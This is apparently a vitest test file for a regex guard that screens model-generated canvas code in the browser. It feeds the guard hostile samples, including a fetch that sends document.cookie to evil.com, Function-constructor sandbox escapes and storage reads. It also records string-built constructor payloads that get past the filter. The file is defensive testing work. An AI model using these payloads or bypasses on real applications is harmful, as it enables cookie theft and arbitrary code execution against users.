import { describe, it, expect } from 'vitest';
import { isElementCodeSafe } from './codeGuards';
import { mockElementJson } from '@/lib/aiMock';

// isElementCodeSafe gates the (ctx, props) draw-function body that runs UNSANDBOXED in users' browsers
// via new Function (runtime.ts). A regression that lets a banned API through means executing hostile
// model-written code on the client — so its REJECTION path needs real adversarial coverage, not just a
// happy-path "the safe sample passes" check. (A regex is a tripwire, not a sandbox — see the residual
// obfuscation cases at the bottom, which are documented, not claimed-safe.)

describe('isElementCodeSafe — accepts legitimate draw code', () => {
  it('accepts a plain canvas draw', () => {
    expect(isElementCodeSafe('ctx.fillStyle = props.theme.accent; ctx.fillRect(0, 0, props.width * props.progress, props.height);')).toBe(true);
  });

  it('accepts a normal bounded for-loop (not an endless loop)', () => {
    expect(isElementCodeSafe('for (let i = 0; i < 10; i++) { ctx.fillRect(i * 10, 0, 8, props.height); }')).toBe(true);
  });

  it('accepts Math / String / typeof usage', () => {
    expect(isElementCodeSafe("const v = props.data && typeof props.data === 'object' ? String(props.data.value) : ''; ctx.font = '700 ' + Math.round(props.height * 0.3) + 'px sans-serif';")).toBe(true);
  });

  it('accepts the shipped mock element code (guards against over-blocking)', () => {
    const g = JSON.parse(mockElementJson('x')) as { code: string };
    expect(isElementCodeSafe(g.code)).toBe(true);
  });
});

describe('isElementCodeSafe — rejects sandbox-escape APIs', () => {
  const attacks: Array<[string, string]> = [
    ['fetch', "fetch('https://evil.com/exfil?c=' + document.cookie);"],
    ['eval', "eval('alert(1)');"],
    ['window', 'window.location = "https://evil.com";'],
    ['document', 'document.body.innerHTML = "";'],
    ['new Function', "const f = new Function('return process')();"],
    ['globalThis', 'globalThis.fetch("x");'],
    ['localStorage', 'localStorage.getItem("token");'],
    ['sessionStorage', 'sessionStorage.clear();'],
    ['indexedDB', 'indexedDB.open("db");'],
    ['XMLHttpRequest', 'const x = new XMLHttpRequest();'],
    ['WebSocket', 'new WebSocket("wss://evil");'],
    ['Worker', 'new Worker("w.js");'],
    ['import()', "import('https://evil.com/x.js');"],
    ['require', 'require("fs");'],
  ];
  it.each(attacks)('rejects %s', (_label, code) => {
    expect(isElementCodeSafe(code)).toBe(false);
  });
});

describe('isElementCodeSafe — rejects the constructor / Function escape', () => {
  // Each payload's ONLY banned token is `constructor` (no fetch/globalThis/eval/etc.), so each one
  // specifically guards the `constructor` ban — it flips to `safe` if that entry is removed.
  it('rejects (()=>{}).constructor(...)', () => {
    expect(isElementCodeSafe("(()=>{}).constructor('return 1')();")).toBe(false);
  });
  it('rejects [].constructor.constructor(...)', () => {
    expect(isElementCodeSafe("[].constructor.constructor('return 1')();")).toBe(false);
  });
  it('rejects bracket access to constructor', () => {
    expect(isElementCodeSafe("({})['constructor']['constructor']('return 1')();")).toBe(false);
  });
});

describe('isElementCodeSafe — rejects endless loops', () => {
  it.each([
    ['while(true)', 'while (true) { ctx.fillRect(0,0,1,1); }'],
    ['while(1)', 'while (1) {}'],
    ['while(!0)', 'while (!0) {}'],
    ['for(;;)', 'for (;;) {}'],
    ['for(init;;incr)', 'for (let i = 0; ; i++) {}'],
    ['do..while(1)', 'do { ctx.fillRect(0,0,1,1); } while (1);'],
  ])('rejects %s', (_label, code) => {
    expect(isElementCodeSafe(code)).toBe(false);
  });
});

describe('isElementCodeSafe — obfuscation caught via a present identifier', () => {
  it('rejects window["fetch"] (window is still literally present)', () => {
    expect(isElementCodeSafe('window["fetch"]("x");')).toBe(false);
  });
  it('rejects document["coo" + "kie"] (document is still present)', () => {
    expect(isElementCodeSafe('const c = document["coo" + "kie"];')).toBe(false);
  });
});

describe('isElementCodeSafe — rejects window aliases used as global roots', () => {
  // self/top/parent/frames/location reach the same global object with NO obfuscation.
  it.each([
    ['top.location', "top.location = 'https://evil.example/phish';"],
    ['self["fet"+"ch"]', "self['fet' + 'ch']('x');"],   // alias caught even though 'fetch' is string-built
    ['parent.location', "parent.location.href = 'https://evil';"],
    ['frames.location', "frames.location = 'x';"],
    ['location.assign', "location.assign('https://evil');"],
  ])('rejects %s', (_label, code) => {
    expect(isElementCodeSafe(code)).toBe(false);
  });

  it('still accepts canvas values / coordinates that merely spell an alias', () => {
    // The alias ban is member-access-qualified, so these must NOT be over-blocked.
    expect(isElementCodeSafe("ctx.textBaseline = 'top'; ctx.textAlign = 'left';")).toBe(true);
    expect(isElementCodeSafe('const top = 10, left = 4; ctx.fillRect(left, top, 8, 8);')).toBe(true);
  });
});

describe('isElementCodeSafe — DOCUMENTED residual limitations (regex is a tripwire, NOT a sandbox)', () => {
  // A regex banned-list cannot catch an identifier assembled at runtime from string pieces — and that
  // includes the INVOCATION mechanism itself: `constructor` can be string-built too, so the escape
  // below reaches the Function constructor and runs arbitrary code without ever writing a banned token,
  // and 'use strict' does NOT close it. These are pinned as KNOWN, fully-exploitable gaps until a real
  // out-of-process sandbox (Worker) lands — if a future sandbox flips them to `false`, tighten here.
  it('does NOT catch a fully string-built identifier', () => {
    expect(isElementCodeSafe("const g = 'fet' + 'ch';")).toBe(true);
  });
  it('KNOWN GAP: a string-built constructor escape passes the filter (full ACE until a real sandbox)', () => {
    expect(isElementCodeSafe("({})['con'+'structor']['con'+'structor']('return this')();")).toBe(true);
  });
});
